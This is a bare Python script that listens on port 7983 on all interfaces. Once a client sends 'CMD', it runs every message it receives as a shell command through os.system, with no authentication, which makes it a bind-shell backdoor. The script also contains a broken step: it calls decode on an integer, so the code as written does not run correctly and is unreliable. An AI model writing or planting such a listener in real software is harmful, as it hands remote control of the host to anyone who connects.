#!/usr/bin/env python3
import os
import socket
def main():
    sock = socket.create_server(("0.0.0.0", 7983))
    length = 1
    while(length != 0):
        connArray = sock.accept()
        conn = connArray[0]
        hexMessage = conn.recv(4096).decode('utf-8')
        message = int(hexMessage).decode('utf-8')
        if(message == "CMD"):
            length = 1
            while(length != 0):
                hexMessage = conn.recv(4096).decode('utf-8')
                message = int(hexMessage).decode('utf-8')
                if(message.lower() == "exit"):
                    length = 0
                if(length != 0):
                    os.system(message)
main()